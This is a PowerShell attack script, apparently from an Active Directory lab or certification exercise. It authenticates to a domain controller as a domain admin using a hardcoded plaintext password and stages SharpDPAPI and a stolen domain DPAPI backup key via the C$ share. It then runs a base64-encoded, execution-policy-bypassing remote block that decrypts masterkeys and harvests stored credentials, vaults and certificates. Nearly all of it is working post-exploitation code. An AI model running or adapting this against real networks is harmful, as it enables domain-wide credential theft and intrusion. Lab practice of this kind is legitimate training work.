# 3.5G end-to-end on dc01 as CADRE\chief_command (DA) via WinRM: stage SharpDPAPI+PVK, decrypt cadre Administrator masterkeys, triage blobs
$ErrorActionPreference = 'Continue'
$dc = 'dc01.cadre.local'
$user = 'cadre.local\chief_command'
$pass = 'C0mm@nd_Ch1ef!'
$securePass = ConvertTo-SecureString $pass -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $securePass)

Write-Output '--- copy SharpDPAPI + PVK to dc01 (WinRM SMB) ---'
$sdp = 'C:\Tools\ADTools\CRTE-2026\SharpDPAPI.exe'
$pvk = 'C:\Tools\ADTools\ntds_capi_0_73eeb965-bf4b-4e9a-8e3e-1814df83d602.keyx.rsa.pvk'
try {
  New-PSDrive -Name dcdrv -PSProvider FileSystem -Root "\\$dc\C$" -Credential $cred -ErrorAction Stop | Out-Null
  Copy-Item $sdp 'dcdrv:\Windows\Temp\sdp-crte.exe' -Force
  Copy-Item $pvk 'dcdrv:\Windows\Temp\ntds-crte.pvk' -Force
  Remove-PSDrive -Name dcdrv
  Write-Output 'COPY_OK'
} catch { Write-Output "COPY_FAIL $($_.Exception.Message)" }

Write-Output '--- run masterkeys + triage on dc01 ---'
$remote = @'
$sdp = 'C:\Windows\Temp\sdp-crte.exe'
$pvk = 'C:\Windows\Temp\ntds-crte.pvk'
Write-Output "SDP $((Get-Item $sdp).Length) PVK $((Get-Item $pvk).Length)"
Write-Output '--- profiles ---'
Get-ChildItem 'C:\Users' -Directory | Select-Object -ExpandProperty Name | ForEach-Object { Write-Output "PROFILE $_" }
Write-Output '--- masterkeys /pvk ---'
& $sdp masterkeys /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "MK|$_" }
Write-Output '--- triage (creds/vaults/certs) /pvk ---'
& $sdp triage /pvk:$pvk 2>&1 | ForEach-Object { Write-Output "TRIAGE|$_" }
Write-Output 'DC01_35G_DONE'
'@
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remote))
Invoke-Command -ComputerName $dc -Credential $cred -ScriptBlock { powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $args[0] } -ArgumentList $enc | ForEach-Object { Write-Output "DC01|$_" }
Write-Output 'DC01_35G_RUNNER_DONE'
